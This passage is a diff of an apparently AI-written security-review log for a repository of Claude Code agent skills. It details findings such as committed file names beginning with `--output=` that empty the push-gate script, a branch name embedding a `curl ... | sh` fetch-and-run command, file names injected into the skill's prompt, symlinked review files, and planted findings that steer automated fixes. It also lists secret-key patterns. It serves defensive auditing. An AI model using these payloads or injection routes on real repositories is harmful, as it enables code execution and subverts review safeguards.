@@ -1,13 +1,15 @@
-## Security Review — 2026-11-12 (scope: paths)
+## Security Review — 2026-11-13 (scope: paths)
 
-**Summary:** Path-scoped scan, at HEAD e3b6b5f, of the three files `codereview-marker surface
-721b632` lists: CLAUDE.md, the security skill, and tests/lint-skills.sh. Their only change since the
-last scan is e3b6b5f (an in-scope re-check drops the carried mark, a lint pin for it, and
-CLAUDE.md's time figures), which changes no command, grant, or trust decision. The two prior NOTEs
-in the security skill still hold, and two new NOTEs trace further ways repository content reaches a
-scan: committed file names substituted into the skill's own prompt, and review files committed as
-symlinks, which Claude Code's Write and Edit refuse but a shell write follows. Nothing resolved; no
-secrets. Totals: 0 BLOCK / 1 WARN / 29 NOTE.
+**Summary:** Path-scoped scan, at HEAD 9afc578, of the four files `codereview-marker surface
+e3b6b5f` lists: CLAUDE.md, the codereview and security skills, and tests/lint-skills.sh. Their
+changes since the last scan (38e6c73 names the carried mark literally in the security skill's
+re-check and post-fix rules; 9afc578 lowers /codereview's effort from xhigh to high; lint pins for
+both) change no command, grant, or trust decision. All nine prior NOTEs in the two skills still
+hold; the five in the codereview skill were re-checked against their full text from SECURITY.md at
+8d5ff93 and are written out in full again. One new NOTE: the security skill's changes-only diffs
+and secret-history command honor a repository's `-diff` attribute, so a secret committed and
+removed in such a path never reaches the scan. Nothing resolved; no secrets. Totals: 0 BLOCK / 1
+WARN / 30 NOTE.
 
 ### Findings
 
@@ -36,39 +38,67 @@ repository, so a committed path that begins with `--output=` makes git empty a f
 committer's choosing, and a name holding `$(...)`, a backtick span, or a single quote runs a command
 when pasted inside quotes.
   Attack vector: anyone whose commit the user pulls (a collaborator on a shared branch, a
-    contributor's PR branch checked out for review) adds a file at the path
-    `--output=/home/<user>/.claude/settings.json`; git's path checks refuse components such as `.`,
-    `..`, and `.git`, not a leading dash, and `<user>` is often guessable from commit metadata.
-    Before the next push, /codereview's Step 5 lists the files changed since the last scan with
-    `codereview-marker surface`, which prints each name raw (bin/codereview-marker:149-160: `-z`,
-    `core.quotePath=false`, `printf '%s\n'`), and hands the list to /security without editing it
-    (claude/skills/codereview/SKILL.md:421-422, 464-465). The file is agent configuration under
-    `.claude/`, which Step 2 puts first (lines 78-83) and Step 3 says to check for committed
-    secrets, so the model runs the template: `git log -p --follow -3
-    --output=/home/<user>/.claude/settings.json`. Git opens the target for writing, then exits 128
-    because `--follow` has no pathspec left, and the user's global Claude Code settings (the file
-    that registers the push-gate hook and holds the permission rules) are left empty. Any file the
-    user can write is reachable the same way; `--output=../<name>` needs no home path and reaches
-    the repo's parent directory. If the model drops `--follow`, git instead writes the last three
-    commits' log into the target, where in `~/.bashrc` a commit-message line (indented four spaces)
-    runs at the next shell start. A name such as `x$(<cmd>).py` runs `<cmd>` when pasted bare or
-    inside double quotes, and one that also holds a single quote escapes single quotes; /codefix's
-    syntax checks (claude/skills/codefix/SKILL.md:73-74) paste the changed file's name into a
-    command the same way. Outside auto mode, both skills' `Bash(*)` grants run these unprompted.
-  Evidence: git 2.34.1 in scratch directories: `git log -p --follow -3 --output=<file>` printed
-    "fatal: --follow requires exactly one pathspec", exited 128, and left an existing 8-byte file
-    at 0 bytes; a scratch repo committed `-dash.txt` and a name holding a backtick span, and
-    `codereview-marker surface` printed both raw. Not run through the skill or a live model.
+    contributor's PR branch checked out for review), or the author of a repository the user audits
+    with /security's full scope, commits a file under a directory named `--output=..`; git refuses
+    path components that are exactly `.`, `..`, or `.git`, not this one. Under the documented
+    `~/src/<repo>` layout (README.md:80-81, 253), the path
+    `--output=../zat.env/hooks/pre-push-codereview.sh` names the push-gate script that
+    ~/.claude/settings.json runs, through `bash`, for every project. /codereview's Step 5 hands
+    /security the `codereview-marker surface` list unedited (claude/skills/codereview/SKILL.md:420-421,
+    464-465; bin/codereview-marker:149-160 prints names raw), and a full audit lists the files
+    itself. A scan that checks each in-scope file's history, as recent scans here did (with a `--`
+    the template lacks), runs `git log -p --follow -3 --output=../zat.env/hooks/pre-push-codereview.sh`.
+    Git opens the target for writing, then exits 128 because `--follow` has no pathspec left; the
+    script is left empty, bash runs an empty script as success, and the gate allows every push in
+    every project until the change in zat.env is noticed. An absolute form such as
+    `--output=/home/<user>/.claude/settings.json` (the hook registrations and permission rules)
+    works the same way when `<user>` is guessable. If the model drops `--follow`, git instead writes
+    the last three commits' log into the target, where commit-message lines (indented four spaces)
+    run as commands in a shell script or in `~/.bashrc`. A name such as `x$(<cmd>).py` runs `<cmd>`
+    when pasted bare or inside double quotes, and one that also holds a single quote escapes single
+    quotes; /codefix's syntax checks (claude/skills/codefix/SKILL.md:73-74) paste the changed file's
+    name into a command the same way. Outside auto mode, both skills' `Bash(*)` grants run these
+    unprompted; this host runs auto mode with `classifyAllShell`.
+  Evidence: git 2.34.1, scratch repo at this scan: a committed path `--output=../decoy.txt` was
+    listed raw by `codereview-marker surface`, and the template with that name pasted bare exited
+    128 ("--follow requires exactly one pathspec") and left an 8-byte file in the repo's parent
+    directory at 0 bytes; with the path after `--`, git read it as a pathspec and left an identical
+    file alone. ~/.claude/settings.json registers the gate as `bash` on the absolute path of
+    ~/src/zat.env/hooks/pre-push-codereview.sh. Not run through the skill or a live model.
     Confidence: high on the git steps, medium on the model pasting such a name as the template
-    shows, low on likelihood (the name is visibly odd).
-  Remediation: put the path after `--`, in single quotes, in the template (`git log -p --follow -3
-    -- '<file>'`), and tell the scan to report, not paste, any in-scope path that starts with `-` or
-    holds a quote, `$`, a backtick, `;`, `|`, `&`, `<`, `>`, or a control character (a newline
-    included): a committed name like that is a finding by itself. For a deterministic guard, have
-    `codereview-marker surface`, which already refuses a ref that starts with `-`, refuse such
-    paths with a message, so /codereview stops before any skill pastes one. Pin both in
-    tests/lint-skills.sh.
-  Status: found 2026-11-12 at 721b632; last checked 2026-11-12 at e3b6b5f
+    shows, low on likelihood (the name is visibly odd in a file list).
+  Remediation: write the template as `git log -p --text --follow -3 -- '<file>'` (`--text` is for
+    the next NOTE), and tell the scan to report, not paste, any in-scope path that starts with `-`
+    or holds a quote, `$`, a backtick, `;`, `|`, `&`, `<`, `>`, or a control character (a newline
+    included): a committed name like that is a finding by itself. For a deterministic guard on the
+    /codereview route, have `codereview-marker surface`, which already refuses a ref that starts
+    with `-`, refuse such paths with a message, so /codereview stops before any skill pastes one.
+    Pin both in tests/lint-skills.sh.
+  Status: found 2026-11-12 at 721b632; last checked 2026-11-13 at 9afc578
+
+[NOTE] claude/skills/security/SKILL.md:67-68, 93 — the changes-only diffs and the secret-history
+command read git's diff output, which honors the repository's own .gitattributes, so a text file
+marked `-diff` or `binary` shows only as "Binary files a/<f> and b/<f> differ": a secret committed
+and later removed in such a path never reaches the history check, and a changes-only scan cannot
+see what changed in it.
+  Attack vector: no adversary is needed. A repository marks text paths `-diff` to quiet noisy diffs
+    (lockfiles, generated config, notebooks), and someone commits an API key into one of them and
+    removes it in a later commit. Step 3 reads the file at HEAD, which is clean, and its history
+    through the line-93 template, which prints the binary placeholder for both commits, so the scan
+    reports no secret while the key stays in history, which line 183 says is still a finding. The
+    changes-only diffs (lines 67-68) render such a path the same way, so a change to it reaches that
+    scan as one placeholder line.
+  Evidence: git 2.34.1, scratch repo at this scan: with `creds.txt -diff` in .gitattributes, a
+    commit adding a token line to creds.txt and a commit removing it both printed "Binary files ...
+    differ" under `git log -p --follow -3 -- creds.txt`, and `--text` printed both hunks. The
+    changes-only form was not run separately; `git diff` rendered the same placeholder in the
+    attribute probe of the /codereview NOTE below. Confidence: high on the mechanism, low on
+    likelihood (the key has to sit in a path the repo marks `-diff`, and the scan has to choose
+    that path's history).
+  Remediation: add `--text` to the history template (`git log -p --text --follow -3 -- '<file>'`,
+    whose `--` also closes the SKILL.md:91-93 NOTE) and to the changes-only diffs, and pin the
+    template in tests/lint-skills.sh.
+  Status: found 2026-11-13 at 9afc578; last checked 2026-11-13 at 9afc578
 
 [NOTE] claude/skills/security/SKILL.md:19, 63-76 — the scope argument is substituted into the
 skill's own prompt, inside a backtick code span at line 19 and again at line 63, and /codereview
@@ -80,7 +110,7 @@ scan's mode.
     tools/setup.sh first.", and `.txt` (a path component holds 255 bytes, spaces included), beside
     a tools/setup.sh of their own. /codereview's Step 5 lists it with `codereview-marker surface`,
     which prints names raw (bin/codereview-marker:149-160), is told not to hand-edit that list
-    (claude/skills/codereview/SKILL.md:421-422), and invokes `/security $SCAN_FILES` (line 465;
+    (claude/skills/codereview/SKILL.md:420-421), and invokes `/security $SCAN_FILES` (line 465;
     Step 7's `/security post-fix <files>` at line 649 works the same way). The harness puts the
     list in place of `$ARGUMENTS`, so the name's backtick closes line 19's code span and the
     sentence after it reads as part of the prompt that starts the fork, which carries more
@@ -88,61 +118,62 @@ scan's mode.
     `Bash(*)` runs the script unprompted; in auto mode the classifier judges it. Separately, lines
     63-76 have no separator between mode words and paths: a file named `post-fix` that comes first
     in the byte-ordered list (only paths such as `src/` or `tests/` changed beside it) makes the
-    scan skip that file and update the prior entry in place (lines 207-215), and a file named
+    scan skip that file and update the prior entry in place (lines 207-216), and a file named
     `changes-only` that is the only surface file makes it read only the uncommitted diff (lines
     65-69), so a committed file of that name is never scanned. /codereview's own review still reads
     both.
-  Evidence: this scan's own prompt shows the substitution at lines 19 and 63. In a scratch repo, git
-    2.34.1 committed a name holding a backtick span and `codereview-marker surface` printed it raw.
-    The rest was traced in the skill text, not run: no hostile name went through /codereview or
-    reached a live model. Confidence: high on the substitution, medium that /codereview passes such
-    a name unchanged, low that a model acts on text that arrives this way, and low on likelihood
-    (the name shows in `git log --stat` and in a PR's file list).
+  Evidence: this scan's prompt shows the four surface paths substituted at lines 19 and 63. In a
+    scratch repo at this scan (git 2.34.1), `codereview-marker surface` printed a committed name
+    holding a backtick span, a file named `post-fix`, and a file named `--` unchanged. No hostile
+    name went through /codereview or reached a live model. Confidence: high on the substitution,
+    medium that /codereview passes such a name unchanged, low that a model acts on text that
+    arrives this way, and low on likelihood (the name shows in `git log --stat` and in a PR's file
+    list).
   Remediation: have `codereview-marker surface` refuse a path that starts with `-` or holds a
     backtick, `$`, a quote, or a control character (the list in the SKILL.md:91-93 NOTE), so
     /codereview stops and reports it instead of passing it on; separate mode words from paths
     (`/security -- <files>`, `/security post-fix -- <files>`) and read a mode word only before the
     `--`; and say at line 19 that the argument lists repository paths, which are data. Pin each in
     tests/lint-skills.sh.
-  Status: found 2026-11-12 at e3b6b5f; last checked 2026-11-12 at e3b6b5f
+  Status: found 2026-11-12 at e3b6b5f; last checked 2026-11-13 at 9afc578
 
 [NOTE] claude/skills/security/SKILL.md:52-59, 185-205 — Step 1 reads SECURITY.md, CODEREVIEW.md,
 and SPEC.md, and Step 5 writes SECURITY.md, by name, with no check that each is a regular file, so
 a review file committed as a symlink points the scan's read, and any write that follows the link,
 at a file outside the repository; bin/spec-backlog-apply.sh refuses exactly this for BACKLOG.md
 (lines 60-62, 158-161).
-  Attack vector: someone whose commit the user brings in replaces SECURITY.md, or CODEREVIEW.md
-    (which /codereview reads in Step 1 and writes in Steps 6.5 and 9,
-    claude/skills/codereview/SKILL.md:201-220, 601-610, 690-692), with a symlink to a path the user
-    can write, such as `../../.claude/settings.json` (the push-gate hook registration and the
-    permission rules) or a dangling `../../.bash_aliases`; with the documented `~/src/<repo>`
-    layout, `../../` is the home directory. No reviewer sees the change: codereview-marker leaves
-    the four review files out of the hash, the surface, and the uncommitted check
-    (bin/codereview-marker:68), and the review diffs leave them out too (codereview SKILL.md:248).
-    At the next review, Step 1 reads the target's content as the prior entry. At Step 5, Claude
-    Code's Write and Edit refuse the link and name its target ("Write to the link's target path
-    instead: <target>"); a model that follows that hint, or writes the file through the shell under
-    line 11's `Bash(*)` (`cat >`, `tee`, Python), replaces the target with the review, or creates
-    it when the link dangles. Ubuntu's default `~/.bashrc` sources `~/.bash_aliases`, and bash then
-    runs each backtick span in the review up to the first line that does not parse. `git status`
-    stays clean, because the link itself does not change.
-  Evidence: Claude Code 2.1.311 in a scratch directory: Read returned a symlinked SECURITY.md's
-    target content with no sign of the link; Write (live and dangling link) and Edit refused with
-    the message above and wrote nothing. In a scratch repo, a heredoc written to a committed,
-    symlinked CODEREVIEW.md landed in the target, and `git status --porcelain` and
-    `codereview-marker uncommitted` printed nothing. Bash sourcing review-shaped markdown ran a
-    backtick span on line 3 and stopped at a `(` on line 5; /etc/skel/.bashrc:104-105 sources
-    `~/.bash_aliases`. Recent /codereview runs here wrote CODEREVIEW.md with Write and Edit, not the
-    shell. Not tried: a target outside the project, a live model meeting the refusal, and Claude
-    Code before 2.1.311. Confidence: high on the read and on a shell write following the link, low
-    that a model writes past the tool's refusal, low on likelihood (a PR's file list shows the type
-    change).
+  Attack vector: someone whose commit the user brings in, or the author of a repository the user
+    audits with /security, makes SECURITY.md, or CODEREVIEW.md (which /codereview reads in Step 1
+    and writes in Steps 6.5 and 9, claude/skills/codereview/SKILL.md:201-224, 601-612, 690-692), a
+    symlink to a path the user can write, such as `../../.claude/settings.json` (the push-gate hook
+    registration and the permission rules) or a dangling `../../.bash_aliases`; with the documented
+    `~/src/<repo>` layout, `../../` is the home directory. In the /codereview flow no reviewer sees
+    the change: codereview-marker leaves the four review files out of the hash, the surface, and
+    the uncommitted check (bin/codereview-marker:68), and the review diffs leave them out too
+    (codereview SKILL.md:248). At the next scan, Step 1 reads the target's content as the prior
+    entry. At Step 5, Claude Code's Write and Edit refuse the link and name its target ("Write to
+    the link's target path instead: <target>"); a model that follows that hint, or writes the file
+    through the shell under line 11's `Bash(*)` (`cat >`, `tee`, Python), replaces the target with
+    the review, or creates it when the link dangles. Ubuntu's default `~/.bashrc` sources
+    `~/.bash_aliases` (/etc/skel/.bashrc:104-105), and bash then runs each backtick span in the
+    review up to the first line that does not parse. `git status` stays clean, because the link
+    itself does not change.
+  Evidence: scratch repo at this scan (git 2.34.1): a heredoc written to a committed, symlinked
+    CODEREVIEW.md replaced the target outside the repo, and `git status --porcelain` and
+    `codereview-marker uncommitted` printed nothing. As recorded at e3b6b5f with the same Claude
+    Code (2.1.311): Read returned a symlinked SECURITY.md's target content with no sign of the
+    link; Write (live and dangling link) and Edit refused with the message above and wrote nothing;
+    bash sourcing review-shaped markdown ran a backtick span on line 3 and stopped at a `(` on line
+    5. Recent /codereview runs here wrote CODEREVIEW.md with Write and Edit, not the shell. Not
+    tried: a live model meeting the refusal, and Claude Code before 2.1.311. Confidence: high on the
+    read and on a shell write following the link, low that a model writes past the tool's refusal,
+    low on likelihood (a PR's file list shows the type change).
   Remediation: refuse the run when CODEREVIEW.md, SECURITY.md, TESTING.md, or SPEC.md is a symlink
     or not a regular file, deterministically, as spec-backlog-apply.sh does: for example a
     `codereview-marker` check that the Step 1 of /codereview and of /security runs first, pinned in
     tests/lint-skills.sh. Say in Step 5 that a refused write is reported, not retried at the named
     target or through the shell.
-  Status: found 2026-11-12 at e3b6b5f; last checked 2026-11-12 at e3b6b5f
+  Status: found 2026-11-12 at e3b6b5f; last checked 2026-11-13 at 9afc578
 
 [NOTE] claude/skills/security/SKILL.md:159-168 — a carried NOTE is cut to one sentence and its
 Status line, and when its file returns to a scan's scope the re-check starts from that sentence:
@@ -158,27 +189,144 @@ resolved.
     not try then appear in no current finding, and no later scan brings them back. Line 155 says
     git history holds earlier versions, but the re-check rule (lines 159-162) does not send the
     scan there.
-  Evidence: lines 152-155 and 159-168. The 25 carried NOTEs below keep one sentence each; the full
-    text of 24 is in SECURITY.md at 8d5ff93, and of the /codefix NOTE at c084eac. Confidence:
-    medium on the mechanism (a max-effort scan may search the history unprompted), low that a real
-    case is lost.
+  Evidence: lines 152-155 and 157-168 at 9afc578. The 20 carried NOTEs below keep one sentence
+    each; the full text of 19 is in SECURITY.md at 8d5ff93, and of the /codefix NOTE at c084eac.
+    Recovering it is one `git show` and a search for the finding's first line. Confidence: medium
+    on the mechanism (a max-effort scan may search the history unprompted), low that a real case is
+    lost.
   Remediation: in the in-scope branch, have the scan first read a condensed finding's last full
     text (`git log -p -- SECURITY.md`, searching for its first line) and re-check each case it
     lists, reporting it resolved only when none still holds, and pin that sentence in
     tests/lint-skills.sh. Or carry NOTEs whole: the Status line already keeps a finding from
     growing with each scan.
-  Status: found 2026-11-12 at 721b632; last checked 2026-11-12 at e3b6b5f
+  Status: found 2026-11-12 at 721b632; last checked 2026-11-13 at 9afc578
+
+[NOTE] claude/skills/codereview/SKILL.md:115-126, 148, 175 — External-Only Mode pastes the range
+into shell commands, inside double quotes in Step E.2 and bare in Steps E.3 and E.4, and git
+accepts shell syntax in branch names, so a branch name someone else chose can run a command as the
+user.
+  Attack vector: anyone who can name a branch the user fetches (a collaborator on the shared
+    remote, or a contributor whose fork the user adds as a remote) pushes one whose name holds
+    shell syntax. The user, or the main session on the user's behalf (/codereview is
+    model-invocable), asks for an external review of it, such as `main..origin/<name>`, and the
+    fork pastes the name as the template shows. A `$(...)` or backtick span runs inside E.2's
+    double quotes (line 119) before git sees it; `x$(curl${IFS}-s${IFS}<host>/p|sh)` is a valid
+    branch name. A name holding `;` or `|` resolves, so E.2 passes it, and E.3's bare `<range>`
+    (line 148) splits there: with `<from>..<name>`, the word after a `;` runs as a command with
+    E.3's pathspecs as its arguments, and a `|` pipes the diff into it; line 175 repeats both. The
+    range is also substituted into the fork's prompt (lines 53 and 57), where a backtick closes the
+    code span; git refuses spaces in ref names, which keeps that route to one word. Outside auto
+    mode the skill's `Bash(*)` grant (line 16) runs these unprompted. E.1 stops the mode first
+    where no external reviewer is configured, as on this host.
+  Evidence: at this scan, `git check-ref-format --branch` (git 2.34.1) accepted `x;id`, `x|id`,
+    `x$(id)`, a backtick span, and both quote characters, and refused a name holding a space;
+    ~/.config/claude-reviewers/.env (mode 600) sets neither provider key. As recorded at 1d1b5da in
+    a scratch repo: a branch named `x$(touch${IFS}E2RAN)` made E.2's command, as the template
+    writes it, create E2RAN, and a branch named `x;touch` passed E.2 and then split E.3's command,
+    which ran `touch` on the four pathspecs; lines 115-126, 148, and 175 read the same at 9afc578.
+    Not run through the skill or a live model. Confidence: high on the mechanism, low on likelihood
+    (the name is visibly odd, someone has to pick it for an external review, and the model has to
+    paste it as given).
+  Remediation: in E.2, before any command, stop with "Cannot resolve" when the argument holds
+    anything but letters, digits, and `._/~^@{}+-`, which every range form the mode documents
+    fits. Then single-quote the placeholders (`'<ref>^{commit}'` in E.2, `'<range>'` in E.3 and
+    E.4, and `--range '<range>'`). Pin both in tests/lint-skills.sh beside the `--end-of-options`
+    pins.
+  Status: found 2026-11-07 at 1d1b5da; last checked 2026-11-13 at 9afc578
+
+[NOTE] claude/skills/codereview/SKILL.md:213-219, 576-582 — a finding carried into a review goes to
+/codefix with its suggested fix even when its file is outside the diff, and a carried finding's
+text is repository content: CODEREVIEW.md's prior entry, or a SECURITY.md finding that /security
+carries without re-checking it (claude/skills/security/SKILL.md:163-168), so a planted finding can
+steer a fix outside the visible diff.
+  Attack vector: a commit the operator did not author (as in the accepted review-files risk) adds a
+    WARN to SECURITY.md's current entry about a file the push does not change, such as a CI
+    workflow or a dependency manifest, with a concrete remediation that pins an action or a package
+    to a commit, version, or index the attacker chose. A path-scoped /security run carries it at
+    its original severity without re-checking it, Step 6 sends it to /codefix "like any other when
+    its suggested fix is concrete" (lines 580-582), and /codefix takes the suggested fix as its spec
+    (claude/skills/codefix/SKILL.md:25-26, 42-51). A planted CODEREVIEW.md finding takes the same
+    route after Step 1's check that its pattern is still in the code (lines 213-215), which the
+    attacker can make true, and the rule against downgrading it (lines 218-219). Step 7 skips
+    /codefix only when every open BLOCK and WARN carries the hold mark (lines 618-621), so a
+    planted finding without the mark starts a cycle. The change lands outside the contributor's
+    visible diff, in a review that reports it as a fix. The accepted third-party-model risk covers
+    the external reviewers' findings; this channel is the repo's own files.
+  Evidence: the cited lines at 9afc578, and codefix lines 25-26 and 42-51. What stands in the way
+    is model judgment: the post-fix /security re-check of the files /codefix changed (lines
+    645-656) and the re-review (lines 657-659), both of which see a pin, which reads as hardening.
+    Not run against a live model. Confidence: medium on the mechanism, low on likelihood.
+  Remediation: in Step 6, send a carried finding to /codefix only after this run has confirmed it
+    against the code, as Step 6 already requires for the built-in review's findings (lines
+    587-588), and with a fix this run derives from the code instead of one copied from the carried
+    text. Mark a finding that /security carried as not re-checked `Requires a user decision; not
+    for /codefix.`; since Step 7 runs /codefix only for findings without that mark, the mark alone
+    keeps it out of the fix loop. BACKLOG `review-files-set-review-depth`'s fix, extended to prior
+    findings, would close the planted-text half. Needs a user decision, since 500153c chose the
+    current rule.
+  Status: found 2026-11-07 at 895c3d3; last checked 2026-11-13 at 9afc578
+
+[NOTE] claude/skills/codereview/SKILL.md:248, 492 — the review diffs honor the repository's own
+.gitattributes, so a text file marked `-diff` or `binary` reaches every diff reader as "Binary
+files a/<f> and b/<f> differ", while the marker hash still binds its content (the external-mode
+diffs at lines 148 and 175 do the same).
+  Attack vector: a commit the operator did not write adds `<file> -diff` to .gitattributes beside a
+    change to that file; or, more commonly, a downstream repo marks a lockfile `-diff` to quiet
+    noise, and a dependency swap in it reaches review as that one line. The external reviewers see
+    only the diff, so they get nothing of the change, and a refresh review reads only diff hunks
+    for already-reviewed files (lines 354-356). A full-tier inline review and /security still read
+    the whole file (it stays in `codereview-marker surface`), but nothing marks what changed.
+  Evidence: git 2.34.1, scratch repo at this scan: one commit added `app.py -diff` and changed
+    `return t == SECRET` to `return True`. The Step 2 diff form printed the .gitattributes hunk and
+    "Binary files a/app.py and b/app.py differ", `git diff --numstat` printed `-` counts for
+    app.py, and `git diff --text` showed the change. Lines 148, 175, 248, and 492 pass no
+    `--text`. Confidence: high on the mechanism, low on likelihood.
+  Remediation: in Step 2, list the changed files git renders as binary (`git diff --numstat`
+    prints `-` counts for them), review any that are text with `git diff --text -- <file>`, and
+    send those hunks to the external reviewers too; add `--text` to External-Only Mode's diffs;
+    report an added `-diff` or `binary` attribute on a text path as a finding.
+  Status: found 2026-10-13 at 6c9741a; last checked 2026-11-13 at 9afc578
+
+[NOTE] claude/skills/codereview/SKILL.md:481-485 — the secret-in-diff guard relies on a step that
+reports secrets, and in a full-tier review no step is told to look for them in plain markdown, so a
+key added to a markdown file goes to the external reviewers with the diff.
+  Attack vector: no adversary. A diff touches code and also adds a key to a markdown file, so it
+    takes the full tier. Step 4's full-tier dimensions (lines 386-401) include no secret check
+    (only the light tier's reduced scope does, line 296), and /security receives only
+    `codereview-marker surface` files, which omit plain markdown (bin/codereview-marker:131-144).
+    Unless the inline reviewer notices the key unprompted, nothing reports it, and Step 5.5 sends
+    the diff, key included, to OpenAI and Google.
+  Evidence: traced through the skill text and the surface code at 9afc578; not run end to end. On
+    this host ~/.config/claude-reviewers/.env sets neither provider key, so Step 5.5 sends nothing
+    here. Confidence: high on the mechanism.
+  Remediation: before Step 5.5, grep the exact diff it will send for key patterns (`sk-`,
+    `sk-ant-`, `AIza`, `ghp_`, `github_pat_`, `AKIA`, `xox[bp]-`, `hf_`, private-key headers) and
+    skip the providers on a match, or add a whole-diff secret check to Step 4.
+  Status: found 2026-10-02 at c03a14c; last checked 2026-11-13 at 9afc578
+
+[NOTE] claude/skills/codereview/SKILL.md:426-430, 458-462 — the model extracts the commit field of
+SECURITY.md's META footer and pastes it into shell commands, so codereview-marker's leading-dash
+check (bin/codereview-marker:152) runs only after the shell has expanded the value.
+  Attack vector: a commit that edits SECURITY.md puts a `$(...)` or backtick span in the footer's
+    commit value. Step 5 has the model check that the value "resolves in git" (line 427), which
+    takes a command such as `git rev-parse <value>`, and then run `codereview-marker surface
+    <meta-commit>` (lines 430 and 459). If the model pastes the value unquoted or in double quotes,
+    the substitution runs under the skill's `Bash(*)` grant before git or codereview-marker sees
+    it. Step 2 avoids this for reviewed_up_to by extracting it with a hex-only `grep -oP` inside the
+    command substitution (lines 308 and 333).
+  Evidence: traced through the skill text at 9afc578; not tested against a live model, which may
+    refuse such a value. Confidence: medium on the mechanism, low on likelihood (it needs a hostile
+    edit to SECURITY.md, the accepted review-files risk's premise).
+  Remediation: extract the commit inside the command with a hex-only `grep -oP` (7 to 40 hex
+    characters), as Step 2 does, or add a codereview-marker subcommand that reads the footer, and
+    update the lint pin that matches the Step 5 text (tests/lint-skills.sh:419-422). b47852a closed
+    the same class in /spec with a format rule and single quotes, which would also fit here.
+  Status: found 2026-10-02 at c03a14c; last checked 2026-11-13 at 9afc578
 
 [NOTE] claude/skills/codefix/SKILL.md:42-45 — /codefix takes every BLOCK and WARN anywhere in
 CODEREVIEW.md as its spec, including those under `## Prior review carried forward (uncommitted; not
 current findings)`, so a finding there skips the filters /codereview applies to its own.
   Status: found 2026-11-12 at 721b632; last checked 2026-11-12 at 721b632; carried, not re-checked
-
-[NOTE] claude/skills/codereview/SKILL.md:115-126, 148, 175 — External-Only Mode pastes the range
-into shell commands (inside double quotes in Step E.2, bare in Steps E.3 and E.4), and git accepts
-`$(...)`, backticks, `;`, and `|` in branch names, so a branch name someone else chose can run a
-command as the user.
-  Status: found 2026-11-07 at 1d1b5da; last checked 2026-11-07 at 1d1b5da; carried, not re-checked
 
 [NOTE] claude/skills/pr/SKILL.md:185, 200-210 — the read that condition 4 gives for pulled PR
 changes (`git log -p "${REVIEWED_UP_TO}..HEAD"` or `/codereview external "${REVIEWED_UP_TO}"`, also
@@ -191,13 +339,6 @@ attribute or a moved `reviewed_up_to`; the fix is deferred with BACKLOG
 review text, which anyone who can comment on the PR writes, into a fork whose `allowed-tools`
 pre-approves `Bash(*)`, and the skill never says that text is data.
   Status: found 2026-11-07 at 03aacf2; last checked 2026-11-07 at 1d1b5da; carried, not re-checked
-
-[NOTE] claude/skills/codereview/SKILL.md:213-219, 576-582 — since 500153c, a finding carried into a
-review goes to /codefix with its suggested fix even when its file is outside the diff, and a
-carried finding's text is repo content (CODEREVIEW.md's prior entry, or a SECURITY.md finding
-/security carries without re-checking, claude/skills/security/SKILL.md:142-145), so a planted
-finding can steer a fix outside the visible diff.
-  Status: found 2026-11-07 at 895c3d3; last checked 2026-11-07 at 1d1b5da; carried, not re-checked
 
 [NOTE] claude/skills/pr/SKILL.md:232-240 — the `--match-head-commit` guard ahead of the merge
 applies only when `gh pr merge --help` lists the flag, and this host's gh 2.4.0 (Ubuntu 22.04's
@@ -252,22 +393,6 @@ umask and moves it into place (also lines 267, 276, 285, 307, 353, 370, 388), so
 user restricted to 0600 comes back 0644 or 0664 on each run.
   Status: found 2026-10-13 at 0ccfae7; last checked 2026-11-07 at 895c3d3; carried, not re-checked
 
-[NOTE] claude/skills/codereview/SKILL.md:248, 492 — the review diffs honor the repository's own
-.gitattributes, so a text file marked `-diff` or `binary` reaches every diff reader as "Binary files
-a/<f> and b/<f> differ", while the marker hash still binds its content (same in the external-mode
-diffs at lines 148 and 175).
-  Status: found 2026-10-13 at 6c9741a; last checked 2026-11-07 at 1d1b5da; carried, not re-checked
-
-[NOTE] claude/skills/codereview/SKILL.md:481-485 — the secret-in-diff guard relies on a step that
-reports secrets, and in a full-tier review no step looks for them in plain markdown, so a key added
-to a markdown file goes to the external reviewers with the diff.
-  Status: found 2026-10-02 at c03a14c; last checked 2026-11-07 at 1d1b5da; carried, not re-checked
-
-[NOTE] claude/skills/codereview/SKILL.md:426-430, 458-462 — the model extracts the commit field of
-SECURITY.md's META footer and pastes it into a shell command, so codereview-marker's leading-dash
-check (bin/codereview-marker:152) runs only after the shell has expanded it.
-  Status: found 2026-10-02 at c03a14c; last checked 2026-11-07 at 1d1b5da; carried, not re-checked
-
 [NOTE] bin/review-external.sh:276-278 — without bc, `_calc` splices the cost expression into awk
 program text, and awk's `system()` runs commands, so a non-integer operand would execute as the
 user; `_count` is the only guard.
@@ -303,60 +428,74 @@ caller's unpushed commit subjects to api.openai.com and generativelanguage.googl
   Status: found 2026-10-01 at 379af38; last checked 2026-10-02 at c03a14c; carried, not re-checked
 ```
 
-No prior finding was resolved. The two prior NOTEs in claude/skills/security/SKILL.md were
-re-checked and still hold; their Status lines move to e3b6b5f. The other 26 prior findings are in
-files outside this scan's scope and are carried with their Status lines unchanged; the /codefix
-NOTE is now condensed, and its full text is in SECURITY.md at c084eac.
+No prior finding was resolved. The nine prior NOTEs in claude/skills/security/SKILL.md and
+claude/skills/codereview/SKILL.md were re-checked at 9afc578 and still hold; their Status lines move
+to this scan, and the five /codereview NOTEs, condensed while that file was out of scope, are
+rewritten from their full text at 8d5ff93. The other 21 prior findings are in files outside this
+scan's scope and are carried with their Status lines unchanged.
 
 ### Coverage
 
-All eight dimensions were reviewed for the three files at HEAD e3b6b5f; the working tree matched
+All eight dimensions were reviewed for the four files at HEAD 9afc578; the working tree matched
 HEAD throughout.
 
-- Read in full: claude/skills/security/SKILL.md (258 lines; it is this scan's prompt) and CLAUDE.md
-  (82). tests/lint-skills.sh (2,171) was read through its diff since 721b632 (lines 1133-1134), its
-  helpers (lines 1-43), the security pin block (lines 1100-1145), and its shellcheck and frontmatter
-  sections (lines 2018-2081), with a grep of every write, exec, and interpreter call. Each file's
-  diff since 721b632 was read; e3b6b5f is the only commit that touches them.
-- Read outside the scope to trace findings: claude/skills/codereview/SKILL.md lines 16, 201-220,
-  248, 406-475, 601-610, 636-660, and 690-692; bin/codereview-marker lines 68 and 100-205;
-  bin/spec-backlog-apply.sh lines 56-62 and 152-166; claude/skills/codefix/SKILL.md lines 40-46 and
-  68-78 (for the citations in the SKILL.md:91-93 NOTE, not to re-check the carried /codefix NOTE).
-- Probes, writing only to new scratchpad directories (left in place; deleting them was refused by
-  the permission prompt): Claude Code 2.1.311's Read, Write, and Edit on a symlinked SECURITY.md and
-  a dangling CODEREVIEW.md; a scratch repo, git 2.34.1, that committed `-dash.txt`, a name holding a
